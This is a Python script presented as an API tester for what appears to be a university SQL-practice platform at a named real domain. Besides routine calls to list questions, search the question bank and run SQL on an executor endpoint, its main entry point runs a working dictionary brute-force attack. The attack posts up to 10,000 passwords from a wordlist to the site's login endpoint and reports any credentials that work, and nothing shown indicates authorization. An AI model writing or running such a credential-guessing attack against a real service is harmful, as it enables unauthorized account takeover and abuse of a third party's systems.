from client import Client
import json
from colorama import Fore, Style
import requests
import time

class APITester(Client):
    def test_get_all_questions(self):
        """Test the endpoint to get all questions with pagination"""
        print(Fore.CYAN + "\n=== TESTING GET ALL QUESTIONS ENDPOINT ===")
        url = f"https://dbapi.ptit.edu.vn/api/auth/users/info"
        
        # Test Case 1: Get All (Page 0)
        params = {
            "page": 0,
            "size": 10,
            "sort": "createdAt,desc"
        }

        payload = {
            "keyword": "",
            "userId": self.user_id
        }
        print(Fore.YELLOW + f"[*] Requesting: POST {url}")
        print(f"    Params: {params}")
        
        try:
            resp = self.session.get(url)
            print(f"    Status: {resp.status_code}")
            
            if resp.status_code == 200:
                data = resp.json()
                print(data)
            else:
                print(Fore.RED + f"[-] Failed. Response: {resp.text[:500]}")
                
        except Exception as e:
            print(Fore.RED + f"[-] Exception: {e}")

    def test_search(self):
        """Test the question search endpoint"""
        print(Fore.CYAN + "\n=== TESTING SEARCH ENDPOINTS ===")
        url = f"{self.base_api_url}/question/search"
        
        # Test Case 1: Get All (Page 0)
        params = {
            "page": 0,
            "size": 1000,
            "sort": "createdAt,desc"
        }

        payload = {
            "keyword": "",
            "userId": self.user_id
        }
        print(Fore.YELLOW + f"[*] Requesting: POST {url}")
        print(f"    Params: {params}")
        
        try:
            resp = self.session.post(url, json=payload, params=params)
            print(f"    Status: {resp.status_code}")
            
            if resp.status_code == 200:
                data = resp.json()
                content = data.get('content', [])
                total = data.get('totalElements', 0)
                
                print(Fore.GREEN + f"[+] Success! Found {len(content)} items on page 0 (Total available: {total})")
                
                if content:
                    print(Fore.WHITE + "\nSample Results:")
                    print("-" * 80)
                    print(f"{'CODE':<10} | {'TITLE':<50} | {'LEVEL':<10}")
                    print("-" * 80)
                    for item in content:  # Show all items
                        code = item.get('questionCode', 'N/A')
                        title = item.get('title', 'N/A')
                        level = item.get('level', 'N/A')
                        print(f"{code:<10} | {title[:47]+'...' if len(title)>47 else title:<50} | {level:<10}")
                    print("-" * 80)
            else:
                print(Fore.RED + f"[-] Failed. Response: {resp.text[:500]}")
                
        except Exception as e:
            print(Fore.RED + f"[-] Exception: {e}")

    def test_executor(self):
        """Test the SQL executor endpoint"""
        print(Fore.CYAN + "\n=== TESTING EXECUTOR ENDPOINTS ===")
        # We need a valid question ID. 
        # Note: This ID might need to be updated to a valid one in your DB
        question_id = "f7c4953d-554f-4ba8-a99b-d58671879c49" 
        sql = "SELECT * FROM LearnSQL;"
        
        url = f"{self.base_api_url}/executor/user"
        payload = {
            "questionId": question_id,
            "sql": sql,
            "typeDatabaseId": "11111111-1111-1111-1111-111111111111",
            "userId": self.user_id
        }
        
        print(Fore.YELLOW + f"[*] Requesting: POST {url}")
        try:
            resp = self.session.post(url, json=payload)
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:300]}...")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

    def brute_force_admin_login(self, dictionary_file="wordlists-vn10k.txt", max_attempts=10000):
        """
        Attempt to login with username 'admin' using passwords from a dictionary file.
        Removes failed passwords from the file to avoid retesting.
        
        Args:
            dictionary_file (str): Path to the password dictionary file.
            max_attempts (int): Maximum number of login attempts to try.
        """
        print(Fore.CYAN + "\n=== BRUTE FORCE ADMIN LOGIN ===")
        print(Fore.YELLOW + f"[*] Loading password dictionary from {dictionary_file}...")
        
        try:
            with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"[-] Dictionary file not found: {dictionary_file}")
            return None
        
        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords. Testing first {max_attempts}...")
        print(Fore.CYAN + "-" * 80)
        
        username = "test"
        login_url = self.login_url
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        found = False
        failed_passwords = []
        
        for idx, password in enumerate(passwords[:max_attempts], 1):
            print(Fore.YELLOW + f"[{idx}/{min(max_attempts, len(passwords))}] Trying: {username}:{password}", end=" ... ")
            
            try:
                # Attempt basic credential check via API if available
                # Modify this to match your actual login endpoint
                data = {
                    "username": username,
                    "password": password
                }
                
                resp = session.post(login_url, data=data, timeout=10)
                
                if resp.status_code == 200 and ('login' not in resp.url or 'error' not in resp.text.lower()):
                    print(Fore.GREEN + "✅ SUCCESS!")
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    found = True
                    break
                else:
                    print(Fore.RED + "❌")
                    failed_passwords.append(password)
                    
            except Exception as e:
                print(Fore.RED + f"❌ (Error: {str(e)[:20]})")
                failed_passwords.append(password)
        
        print(Fore.CYAN + "-" * 80)
        
        # Remove failed passwords from file to avoid retesting
        if failed_passwords:
            print(Fore.YELLOW + f"[*] Removing {len(failed_passwords)} failed passwords from {dictionary_file}...")
            try:
                with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as f:
                    remaining_passwords = [line.strip() for line in f if line.strip() and line.strip() not in failed_passwords]
                
                with open(dictionary_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(remaining_passwords))
                    if remaining_passwords:
                        f.write('\n')
                
                print(Fore.GREEN + f"[+] Removed {len(failed_passwords)} passwords. Remaining: {len(remaining_passwords)}")
            except Exception as e:
                print(Fore.RED + f"[-] Error updating dictionary file: {e}")
        
        if found:
            return {"username": username, "password": password}
        else:
            print(Fore.YELLOW + f"[-] No valid credentials found in first {max_attempts} attempts.")
            return None

if __name__ == "__main__":
    tester = APITester()
    # Use the robust login from the parent Client class
    # tester.login_api()
    # tester.get_user_id()
    
    # Run tests
    # tester.test_search()
    # tester.test_get_all_questions()
    # tester.test_executor()
    tester.brute_force_admin_login(max_attempts=10000)
